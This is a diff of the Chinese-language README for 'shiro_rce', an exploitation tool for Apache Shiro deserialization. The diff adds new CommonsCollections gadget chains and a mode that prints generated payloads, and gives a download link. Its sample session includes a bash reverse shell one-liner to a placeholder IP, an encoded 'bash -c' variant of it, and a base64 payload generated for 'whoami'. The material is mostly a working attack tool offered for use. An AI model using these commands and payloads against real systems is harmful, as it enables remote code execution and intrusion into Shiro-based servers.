@@ -1,14 +1,17 @@
 # shiro_rce
 
 ```
-老版本的下载地址：https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip
+下载地址：https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip
+2020-08-21: 
+新增了cc8 cc9 cc10利用链
+新增了可输出生成的payload模式，在执行命令的时候输入output=on即可。
+参考下面的示例
+
 下载地址：
-晚点更新一些多方式回显的版本以及优化一些细节的版本。
+后期会更新一些多框架的回显的以及内存SHELL等等。
 
 
 2020-05-26:
-有监管审查，暂时屏蔽下载地址。
-
 原来的停止服务了，请下载最新版本。
 
 
@@ -34,6 +37,9 @@ keys= --> keys file  自定义key的文件，key按行分割，即每行写一�
 [-] check CommonsCollections5
 [-] check CommonsCollections6
 [-] check CommonsCollections7
+[-] check CommonsCollections8
+[-] check CommonsCollections9
+[-] check CommonsCollections10
 [-] check Groovy1
 [*] find: Groovy1 can be use
 [-] check JSON1
@@ -63,6 +69,21 @@ keys= --> keys file  自定义key的文件，key按行分割，即每行写一�
 > bash=bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
 [-] start process command: bash -c {echo,YmFzaD1iYXNoIC1pID4mIC9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzgwIDA+JjE=}|{base64,-d}|{bash,-i}
 [-] please enter command, input q or quit to quit
+> output=on
+[-] print payload mode on.
+[-] please enter command, enter q or quit to quit, enter back to re-choose gadget
+> whoami
+kPH+bIxk5D2deZiIxcaaaA== - CommonsBeanutils1 - zEC2T+ZP+ib2g+NLMrrU0LRsNu3lr7kjq
+82987eI8FZxA8ckaX8LsMNHdParxVS9aYg0Oxl91WD5GztG6Dmg/QO/sjxi+kX/sFpHgqwtG4MCQoogH
+Jkhnj73PI6Wn8AJWQyXoOGNMkyboGcEm0Ti1h+WMGQEqw57tRl7Pjr0pMr2oZcUj9huwC/Lfr090FX7v
+rPrU5JnQm2Qo7ZrMPnxENXs0yMT6HfU75OejeF6kXbWTaGlvfByscF1ljoDR/k2txdQ1eK4nZ4ReOAqM
+uUeeaXwirEw2kg58GktvB2Ghw4egXJBQUdP3H8iE+zrkf12YlPs/RAOq8w0mWfvwB7EnCW3Z83YP8vV1
++reLT9oNyUpCfjKyQVodnpZJY7If4F9al8He7E832RR3mhFvsjJDyNFTbB4TPrRqFDehSVuHib5qkh0s
+0YjvCGErxDLH9pFS4G9rNYQeAnXBKeNzS5q2O0xCe5xg4X6l8R6XsU2/V1d6wd27U7u18+DJlo/v58vj
+SyUtUaEAAuMN9C30Rr+r7Tk9MVC55eS8l82fURpUwttcRADhJ0esKHAFFAkwnisbAb4Uugz3IADojYlH
+BNFtWFuV2dsuqkionEROKLIdVHJGR8URmk79v8lbLbpCWI3cTCf81SwwBoYylKXCyHX2X08VlEUvuHWk
+ypx9gVvDuQQQFTGP4ljwpU1NlQPqxaLXmnZ5TyJN2sycL9s8VWMYls4uFATtMkpXXcwaQGFVjCzFrABv
+[-] please enter command, enter q or quit to quit, enter back to re-choose gadget
 > quit
 [-] start process command: quit
 [-] quit
